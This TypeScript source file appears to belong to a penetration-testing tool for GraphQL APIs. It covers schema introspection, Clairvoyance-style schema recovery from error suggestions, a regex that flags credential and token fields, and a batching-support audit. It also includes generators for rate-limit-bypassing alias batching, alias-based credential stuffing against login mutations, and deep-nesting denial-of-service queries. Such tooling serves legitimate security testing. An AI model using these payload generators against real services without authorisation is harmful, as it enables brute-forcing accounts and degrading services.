/**
 * Sentinel V6 - InQL GraphQL Security & Introspection AST Engine
 *
 * Inspired by Doyensec InQL & Clairvoyance.
 * Implements full GraphQL schema introspection, AST parsing, sensitive field discovery,
 * query generator, batching attacks (array & alias), and recursion/DoS depth testing.
 */

import { ipcClient } from '../../ipc/client';
import { RepeaterExecutionResult } from '../../types/repeater';

export interface GraphQLFieldArg {
  name: string;
  type: string;
  defaultValue?: string;
  description?: string;
}

export interface GraphQLField {
  name: string;
  description?: string;
  args: GraphQLFieldArg[];
  returnType: string;
  isSensitive: boolean;
}

export interface GraphQLType {
  name: string;
  kind: 'OBJECT' | 'INTERFACE' | 'UNION' | 'ENUM' | 'INPUT_OBJECT' | 'SCALAR';
  description?: string;
  fields: GraphQLField[];
}

export interface ParsedSchema {
  endpoint: string;
  queryTypeName?: string;
  mutationTypeName?: string;
  subscriptionTypeName?: string;
  queries: GraphQLField[];
  mutations: GraphQLField[];
  subscriptions: GraphQLField[];
  types: GraphQLType[];
  sensitiveFieldsCount: number;
  rawSchemaJson?: any;
}

export interface GraphQLSecurityAudit {
  introspectionEnabled: boolean;
  arrayBatchingSupported: boolean;
  aliasBatchingSupported: boolean;
  fieldSuggestionsEnabled: boolean;
  sensitiveQueriesDiscovered: string[];
  sensitiveMutationsDiscovered: string[];
}

export interface GraphQLExecutionResult {
  statusCode: number;
  durationMs: number;
  data?: any;
  errors?: any[];
  rawResponse: string;
}

// ─── Standard Comprehensive Introspection Query ─────────────────────────────

export const FULL_INTROSPECTION_QUERY = `query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
          defaultValue
        }
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
        isDeprecated
        deprecationReason
      }
    }
  }
}`;

const SENSITIVE_REGEX = /password|secret|token|api_?key|private|credential|credit_?card|auth|admin|superuser|internal_notes|ssn|hash|session/i;

// ─── GraphQLEngine Class ────────────────────────────────────────────────────

export class GraphQLEngine {
  private endpoint: string;
  private defaultHeaders: Record<string, string>;

  constructor(endpoint: string, defaultHeaders: Record<string, string> = {}) {
    this.endpoint = endpoint;
    this.defaultHeaders = defaultHeaders;
  }

  /**
   * Dispatches a live GraphQL query via Sentinel IPC Client
   */
  public async executeQuery(
    query: string,
    variables: Record<string, any> = {},
    customHeaders: Record<string, string> = {}
  ): Promise<GraphQLExecutionResult> {
    const host = this.getHost(this.endpoint);
    const path = this.getPathWithQuery(this.endpoint);
    const bodyStr = JSON.stringify({ query, variables });

    const headers: Record<string, string> = {
      Host: host,
      'User-Agent': 'Sentinel-InQL/6.0',
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'Content-Length': String(new TextEncoder().encode(bodyStr).length),
      ...this.defaultHeaders,
      ...customHeaders,
    };

    const headerLines = Object.entries(headers)
      .map(([k, v]) => `${k}: ${v}`)
      .join('\r\n');

    const rawReq = `POST ${path} HTTP/1.1\r\n${headerLines}\r\n\r\n${bodyStr}`;

    const startTime = performance.now();
    try {
      const res: RepeaterExecutionResult = await ipcClient.sendRepeaterRequest({
        tabId: 'inql_exec',
        targetUrl: this.endpoint,
        rawRequest: rawReq,
      });

      const durationMs = res.durationMs || Math.round(performance.now() - startTime);
      let parsed: any = {};
      try {
        parsed = JSON.parse(res.body || '{}');
      } catch {
        // Not JSON
      }

      return {
        statusCode: res.statusCode || 200,
        durationMs,
        data: parsed.data,
        errors: parsed.errors,
        rawResponse: res.rawResponse || res.body || '',
      };
    } catch (err: any) {
      return {
        statusCode: 0,
        durationMs: Math.round(performance.now() - startTime),
        rawResponse: `Connection failed: ${err?.message || 'Network error'}`,
      };
    }
  }

  /**
   * Extracts field suggestion names from GraphQL error message
   */
  public static extractFieldSuggestions(errorMessage: string): string[] {
    const suggestions: string[] = [];
    const matchDidYouMean = errorMessage.match(/Did you mean\s+([^?]+)\?/i);
    if (matchDidYouMean && matchDidYouMean[1]) {
      const candidates = matchDidYouMean[1].match(/["']([^"']+)["']/g);
      if (candidates) {
        for (const c of candidates) {
          const clean = c.replace(/["']/g, '').trim();
          if (clean && !suggestions.includes(clean)) suggestions.push(clean);
        }
      }
    }
    return suggestions;
  }

  /**
   * Runs the full Introspection Query and parses the schema AST
   */
  public async introspectSchema(): Promise<ParsedSchema> {
    const res = await this.executeQuery(FULL_INTROSPECTION_QUERY);
    if (!res.data || !res.data.__schema) {
      throw new Error(
        `Introspection query failed or was rejected by endpoint (HTTP ${res.statusCode}). Schema disabled or protected.`
      );
    }

    return this.parseSchema(res.data.__schema);
  }

  /**
   * Clairvoyance-style Schema Recovery via Error Field Suggestions.
   * Probes endpoint with root prefixes to recover schema fields when __schema introspection is disabled.
   */
  public async recoverSchemaViaFieldSuggestions(
    customWordlist?: string[],
    onProgress?: (discoveredCount: number, currentWord: string) => void
  ): Promise<ParsedSchema> {
    const defaultProbes = [
      'user', 'users', 'account', 'accounts', 'profile', 'admin', 'auth', 'login', 'me', 'viewer',
      'node', 'nodes', 'search', 'query', 'item', 'items', 'product', 'products', 'order', 'orders',
      'payment', 'system', 'config', 'settings', 'token', 'tokens', 'session', 'file', 'files',
      'upload', 'report', 'log', 'logs', 'audit', 'role', 'roles', 'permission', 'permissions',
      'organization', 'tenant', 'export', 'dashboard', 'version', 'health', 'metrics', 'env',
      'createUser', 'updateUser', 'deleteUser', 'changePassword', 'resetPassword', 'signIn', 'signUp',
      'authenticate', 'generateToken', 'refreshToken', 'transfer', 'invoice', 'billing', 'customer'
    ];
    const wordlist = customWordlist && customWordlist.length > 0 ? customWordlist : defaultProbes;

    const discoveredQueries = new Map<string, GraphQLField>();
    const discoveredMutations = new Map<string, GraphQLField>();
    const discoveredTypes = new Map<string, GraphQLType>();

    for (let i = 0; i < wordlist.length; i++) {
      const word = wordlist[i];
      onProgress?.(discoveredQueries.size, word);

      // Probe non-existent query to provoke "Did you mean..."
      const probeQuery = `query ClairvoyanceProbe { __probe_${word}_xyz }`;
      try {
        const res = await this.executeQuery(probeQuery);
        const errors = res.errors || [];
        for (const err of errors) {
          const msg = err.message || '';
          const suggestions = GraphQLEngine.extractFieldSuggestions(msg);
          for (const s of suggestions) {
            if (!discoveredQueries.has(s)) {
              const isSensitive = SENSITIVE_REGEX.test(s);
              discoveredQueries.set(s, {
                name: s,
                description: 'Discovered via Clairvoyance Error Suggestions',
                args: [],
                returnType: 'Unknown',
                isSensitive,
              });
            }
          }
        }
      } catch {
        // Continue probing
      }

      // Also probe mutations
      const probeMutation = `mutation ClairvoyanceMutationProbe { __probe_${word}_xyz }`;
      try {
        const res = await this.executeQuery(probeMutation);
        const errors = res.errors || [];
        for (const err of errors) {
          const msg = err.message || '';
          const suggestions = GraphQLEngine.extractFieldSuggestions(msg);
          for (const s of suggestions) {
            if (!discoveredMutations.has(s)) {
              const isSensitive = SENSITIVE_REGEX.test(s);
              discoveredMutations.set(s, {
                name: s,
                description: 'Discovered via Clairvoyance Mutation Suggestions',
                args: [],
                returnType: 'Unknown',
                isSensitive,
              });
            }
          }
        }
      } catch {
        // Continue probing
      }
    }

    // Now for top discovered queries, probe their subfields
    const queryNames = Array.from(discoveredQueries.keys()).slice(0, 10);
    for (const qName of queryNames) {
      const probeSubfield = `query SubfieldProbe { ${qName} { __subfield_probe_xyz } }`;
      try {
        const res = await this.executeQuery(probeSubfield);
        const errors = res.errors || [];
        for (const err of errors) {
          const msg = err.message || '';
          // Check for type name: Cannot query field "__subfield_probe_xyz" on type "TypeName"
          const typeMatch = msg.match(/on type ["']([^"']+)["']/i);
          const typeName = typeMatch ? typeMatch[1] : `${qName.charAt(0).toUpperCase() + qName.slice(1)}Type`;
          const suggestions = GraphQLEngine.extractFieldSuggestions(msg);

          if (suggestions.length > 0) {
            const subfields: GraphQLField[] = suggestions.map((sf) => ({
              name: sf,
              description: `Inferred subfield on ${typeName}`,
              args: [],
              returnType: 'String',
              isSensitive: SENSITIVE_REGEX.test(sf),
            }));

            discoveredTypes.set(typeName, {
              name: typeName,
              kind: 'OBJECT',
              description: 'Reconstructed via Clairvoyance Subfield Probes',
              fields: subfields,
            });

            // Update returnType of query
            const existingQuery = discoveredQueries.get(qName);
            if (existingQuery) {
              existingQuery.returnType = typeName;
            }
          }
        }
      } catch {
        // Continue
      }
    }

    const queries = Array.from(discoveredQueries.values());
    const mutations = Array.from(discoveredMutations.values());
    const types = Array.from(discoveredTypes.values());
    let sensitiveCount = 0;
    queries.forEach((q) => { if (q.isSensitive) sensitiveCount++; });
    mutations.forEach((m) => { if (m.isSensitive) sensitiveCount++; });
    types.forEach((t) => t.fields.forEach((f) => { if (f.isSensitive) sensitiveCount++; }));

    return {
      endpoint: this.endpoint,
      queryTypeName: 'Query',
      mutationTypeName: 'Mutation',
      subscriptionTypeName: 'Subscription',
      queries,
      mutations,
      subscriptions: [],
      types,
      sensitiveFieldsCount: sensitiveCount,
    };
  }

  /**
   * Parses __schema AST into queries, mutations, subscriptions, and types
   */
  public parseSchema(rawSchema: any): ParsedSchema {
    const queryTypeName = rawSchema.queryType?.name || 'Query';
    const mutationTypeName = rawSchema.mutationType?.name || 'Mutation';
    const subscriptionTypeName = rawSchema.subscriptionType?.name || 'Subscription';

    const queries: GraphQLField[] = [];
    const mutations: GraphQLField[] = [];
    const subscriptions: GraphQLField[] = [];
    const types: GraphQLType[] = [];
    let sensitiveFieldsCount = 0;

    const rawTypes: any[] = rawSchema.types || [];

    for (const t of rawTypes) {
      // Ignore internal GraphQL introspection meta types (__Schema, __Type, etc.)
      if (t.name.startsWith('__')) continue;

      const fields: GraphQLField[] = [];
      if (t.fields && Array.isArray(t.fields)) {
        for (const f of t.fields) {
          const isSensitive = SENSITIVE_REGEX.test(f.name) || (f.description && SENSITIVE_REGEX.test(f.description));
          if (isSensitive) sensitiveFieldsCount++;

          const args: GraphQLFieldArg[] = (f.args || []).map((a: any) => ({
            name: a.name,
            type: this.resolveTypeName(a.type),
            defaultValue: a.defaultValue,
            description: a.description,
          }));

          fields.push({
            name: f.name,
            description: f.description,
            args,
            returnType: this.resolveTypeName(f.type),
            isSensitive,
          });
        }
      }

      if (t.name === queryTypeName) {
        queries.push(...fields);
      } else if (t.name === mutationTypeName) {
        mutations.push(...fields);
      } else if (t.name === subscriptionTypeName) {
        subscriptions.push(...fields);
      } else {
        types.push({
          name: t.name,
          kind: t.kind,
          description: t.description,
          fields,
        });
      }
    }

    return {
      endpoint: this.endpoint,
      queryTypeName,
      mutationTypeName,
      subscriptionTypeName,
      queries,
      mutations,
      subscriptions,
      types,
      sensitiveFieldsCount,
      rawSchemaJson: rawSchema,
    };
  }

  /**
   * Probes endpoint for high-impact GraphQL security configurations
   */
  public async auditSecurity(schema?: ParsedSchema): Promise<GraphQLSecurityAudit> {
    // 1. Check Array Batching
    const arrayBatchProbe = JSON.stringify([
      { query: '{ __typename }' },
      { query: '{ __typename }' },
    ]);
    let arrayBatchingSupported = false;
    try {
      const res = await this.executeQueryRaw(arrayBatchProbe);
      if (res.statusCode === 200 && res.body.startsWith('[') && res.body.includes('__typename')) {
        arrayBatchingSupported = true;
      }
    } catch {
      arrayBatchingSupported = false;
    }

    // 2. Check Alias Batching
    const aliasBatchProbe = `query AliasTest {
      a1: __typename
      a2: __typename
      a3: __typename
    }`;
    let aliasBatchingSupported = false;
    try {
      const res = await this.executeQuery(aliasBatchProbe);
      if (res.data && res.data.a1 && res.data.a2) {
        aliasBatchingSupported = true;
      }
    } catch {
      aliasBatchingSupported = false;
    }

    // 3. Check Field Suggestions / Autocomplete Leaks
    const suggestionProbe = `query { __misspelled_query_xyz }`;
    let fieldSuggestionsEnabled = false;
    try {
      const res = await this.executeQuery(suggestionProbe);
      const errStr = JSON.stringify(res.errors || '');
      if (errStr.includes('Did you mean') || errStr.includes('suggestion')) {
        fieldSuggestionsEnabled = true;
      }
    } catch {
      fieldSuggestionsEnabled = false;
    }

    const sensitiveQueries = schema
      ? schema.queries.filter((q) => q.isSensitive).map((q) => q.name)
      : [];
    const sensitiveMutations = schema
      ? schema.mutations.filter((m) => m.isSensitive).map((m) => m.name)
      : [];

    return {
      introspectionEnabled: Boolean(schema && schema.queries.length > 0),
      arrayBatchingSupported,
      aliasBatchingSupported,
      fieldSuggestionsEnabled,
      sensitiveQueriesDiscovered: sensitiveQueries,
      sensitiveMutationsDiscovered: sensitiveMutations,
    };
  }

  // ─── Attack Generators ────────────────────────────────────────────────────

  /**
   * Generates an array-based batching payload to test rate limit bypass
   */
  public generateArrayBatchingAttack(query: string, count: number = 10): string {
    const singleObj = { query };
    const arr = Array.from({ length: count }, () => singleObj);
    return JSON.stringify(arr, null, 2);
  }

  /**
   * Generates an alias-based batching payload
   */
  public generateAliasBatchingAttack(fieldName: string, iterations: number = 5): string {
    const aliases = Array.from({ length: iterations }, (_, i) => `  alias_${i + 1}: ${fieldName} { id username email }`).join('\n');
    return `query AliasBatchBruteforce {\n${aliases}\n}`;
  }

  /**
   * Generates an alias-based credential stuffing / brute-force attack payload (bypassing rate limits)
   */
  public generateCredentialStuffingAliasAttack(
    mutationName: string,
    username: string,
    passwords: string[]
  ): string {
    const lines = passwords.map(
      (pwd, i) =>
        `  attempt_${i + 1}: ${mutationName}(username: "${username}", password: "${pwd.replace(/"/g, '\\"')}") { token success errors }`
    );
    return `mutation AliasCredentialStuffing {\n${lines.join('\n')}\n}`;
  }

  /**
   * Generates a circular deeply nested denial-of-service query
   */
  public generateDeepNestingAttack(depth: number = 7): string {
    let q = 'id\n';
    for (let i = 0; i < depth; i++) {
      q = `parent {\n  ${q.split('\n').join('\n  ')}\n}`;
    }
    return `query DeepRecursionDoS {\n  node(id: "1") {\n    ${q.split('\n').join('\n    ')}\n  }\n}`;
  }

  /**
   * Generates a valid GraphQL template for a given field
   */
  public generateQueryTemplate(field: GraphQLField, isMutation: boolean = false): string {
    const op = isMutation ? 'mutation' : 'query';
    const opName = `${field.name.charAt(0).toUpperCase() + field.name.slice(1)}Op`;

    let argsStr = '';
    if (field.args.length > 0) {
      const innerArgs = field.args.map((a) => `${a.name}: "test_value"`).join(', ');
      argsStr = `(${innerArgs})`;
    }

    return `${op} ${opName} {
  ${field.name}${argsStr} {
    id
    # Add fields here
  }
}`;
  }

  // ─── Helpers ──────────────────────────────────────────────────────────────

  private async executeQueryRaw(rawBody: string): Promise<RepeaterExecutionResult> {
    const host = this.getHost(this.endpoint);
    const path = this.getPathWithQuery(this.endpoint);

    const headers = {
      Host: host,
      'User-Agent': 'Sentinel-InQL/6.0',
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'Content-Length': String(new TextEncoder().encode(rawBody).length),
      ...this.defaultHeaders,
    };

    const headerLines = Object.entries(headers)
      .map(([k, v]) => `${k}: ${v}`)
      .join('\r\n');

    const rawReq = `POST ${path} HTTP/1.1\r\n${headerLines}\r\n\r\n${rawBody}`;

    return await ipcClient.sendRepeaterRequest({
      tabId: 'inql_batch_probe',
      targetUrl: this.endpoint,
      rawRequest: rawReq,
    });
  }

  private resolveTypeName(typeObj: any): string {
    if (!typeObj) return 'Unknown';
    if (typeObj.kind === 'NON_NULL') {
      return `${this.resolveTypeName(typeObj.ofType)}!`;
    }
    if (typeObj.kind === 'LIST') {
      return `[${this.resolveTypeName(typeObj.ofType)}]`;
    }
    return typeObj.name || (typeObj.ofType ? this.resolveTypeName(typeObj.ofType) : 'Object');
  }

  private getHost(url: string): string {
    try {
      return new URL(url).host;
    } catch {
      return 'target.local';
    }
  }

  private getPathWithQuery(url: string): string {
    try {
      const u = new URL(url);
      return `${u.pathname}${u.search}`;
    } catch {
      return '/graphql';
    }
  }
}
